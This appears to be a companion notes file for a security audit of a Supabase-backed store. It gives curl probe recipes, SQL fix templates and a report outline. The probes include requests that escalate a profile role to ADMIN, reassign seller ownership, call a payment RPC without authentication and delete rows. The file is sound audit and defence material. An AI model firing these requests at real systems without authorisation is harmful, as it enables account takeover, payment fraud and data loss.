# Supabase BaaS Audit — Detail Notes, Probe Recipes & Fix Templates

Companion to SKILL.md. Condensed from a full 3-pass audit of a multi-seller QRIS store
(Pages frontend + Supabase + CF Worker payment proxy).

## 1. Probe recipes (curl)

Key extraction (reuse one known-good script; unicode corruption of `.group(1)` via edits is a recurring failure):
```python
import re, subprocess
cfg = subprocess.run(['curl','-s','https://SITE/supabase-config.js'], capture_output=True, text=True).stdout
KEY = re.sear…p(1)
```

### Pass 1 — anon (apikey header only, NO Authorization on the RPC null-probes)
```bash
# table reads (expect [] or public-only rows)
curl -s -H "apikey: ***" "$URL/rest/v1/profiles?select=id,email,role&limit=200"
# RPC without JWT — the NULL-bypass probe (CRITICAL, easy to forget)
curl -s -X POST "$URL/rest/v1/rpc/mark_order_paid" -H "apikey: ***" \
  -H "Content-Type: application/json" -d '{"p_order_id":"ORDER-AAAAAAAA"}'
# auth settings disclosure
curl -s -H "apikey: ***" "$URL/auth/v1/settings"
# storage listing (works anon on public buckets; [] expected on private)
curl -s -X POST "$URL/storage/v1/object/list/<bucket>" -H "apikey: ***" \
  -H "Content-Type: application/json" -d '{"prefix":"","limit":200}'
```
Reading the gate: if a mutating RPC's first error is about the *object* ("Order tidak ditemukan")
rather than auth, there is no auth gate before lookup.

### Pass 2 — authenticated write paths (after registering a probe account)
```bash
TOKEN=<access_token from /auth/v1/token?grant_type=password>
A=(-H "apikey: ***" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "Prefer: return=representation")
curl -s -X PATCH "${A[@]}" "$URL/rest/v1/profiles?id=eq.$UID" -d '{"role":"ADMIN"}'   # escalation
curl -s -X POST  "${A[@]}" "$URL/rest/v1/profiles" -d '{"id":"<other-uid>","name":"x","role":"BUYER"}'
curl -s -X PATCH "${A[@]}" "$URL/rest/v1/sellers?id=eq.$SID" -d '{"user_id":"<victim-uuid>"}'  # WITH CHECK
curl -s -X PATCH "${A[@]}" "$URL/rest/v1/sellers?id=eq.$SID" -d '{"approved":true}'            # flag guard
curl -s -X PATCH "${A[@]}" "$URL/rest/v1/products?id=eq.<other>" -d '{"price":1}'              # 0 rows = owner-only
curl -s -X POST  "${A[@]}" "$URL/rest/v1/orders" -d '{...}'                                    # direct insert
curl -s -X DELETE "${A[@]}" "$URL/rest/v1/sellers?user_id=eq.$UID"                             # cascade probe
```
Note: a PATCH returning `200 []` (0 rows) means RLS silently filtered — NOT success.

### Pass 3 — storage public-endpoint probe
```bash
# upload arbitrary file to non-whitelisted path in public bucket, then read WITHOUT auth
curl -s -X POST "$URL/storage/v1/object/product-files/$UID/notimages/probe.txt" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: text/plain" -d 'SECRET-TEST'
curl -s "$URL/storage/v1/object/public/product-files/$UID/notimages/probe.txt"   # no auth at all
```
If the second returns content: public endpoint ignores policies AND `like '%images/%'` is substring-matched.
Always DELETE the probe file afterwards.

### Deploy artifact exposure
Pages returns `index.html` fallback (200) for missing paths — check BODY first bytes, not status.
Also create `.pagesignore` anyway (excludes `*.sql`, backups, `.wrangler/`, audit dirs).

## 2. Fix templates

### NULL-safe ownership check (migration)
```sql
if auth.uid() is null then raise exception 'Silakan login terlebih dahulu'; end if;
...
if v_row.buyer_id is distinct from auth.uid() and not public.is_admin() then
  raise exception 'Bukan milik kamu';
end if;
```

### Server-side payment verification (Edge Function, service_role)
Design principles proven in audit:
- Function does BOTH `create` (makes the donation server-side with `amount = order.total`
  and `message = order.id` as binding) and `verify` (reads tx_id FROM DB — never from client —
  polls gateway status server-to-server, sets PAID via service_role).
- Client never sets PAID; after the function is live, `revoke execute on ... mark_order_paid from authenticated, anon`.
- Validate response fields if the gateway returns them (`data.message === order.id`, `data.amount >= total`);
  inspect one real gateway response before relying on field names.
- Deploy order: migration + edge function FIRST → test one real purchase → then swap client code → revoke old RPC LAST.

### Storage policy hardening
```sql
drop policy if exists "images public read" on storage.objects;
create policy "images public read" on storage.objects
  for select to anon, authenticated
  using (bucket_id = 'product-files' and (storage.foldername(name))[2] = 'images');
```
Never `like '%images/%'` (substring). Secret files → private bucket + signed URL gated by a
SECURITY DEFINER function that checks order PAID + ownership.

### Suspended-user guard in every mutating RPC
```sql
if (select suspended from public.profiles where id = auth.uid()) then
  raise exception 'Akun kamu ditangguhkan';
end if;
```

### CSP `_headers` for Cloudflare Pages
CSP must whitelist every real origin (fonts, CDN, supabase REST + `wss://` realtime, payment worker, image hosts)
or the page silently blanks. Verify render + zero console violations after deploy.

## 3. Report structure that worked (handoff doc)
1. Severity table (all findings, numbered).
2. Architecture context (so fixer doesn't reverse-engineer).
3. Per-finding: location (file:line), vulnerable snippet, exploit steps, live evidence, impact, fix.
4. "PROVEN SAFE" list with probe evidence — prevents fixer from breaking working defenses.
5. Fix phases: Phase 1 = SQL/config/1-line fixes (ready-to-run migration draft inline);
   Phase 2 = new components (full code inline) with deploy ordering.
6. Verification checklist: copy-paste curl commands, each with expected result.
7. Probe scripts saved alongside (`probe-baseline.py` for regression, `poc-*.py` with cleanup warnings in header).
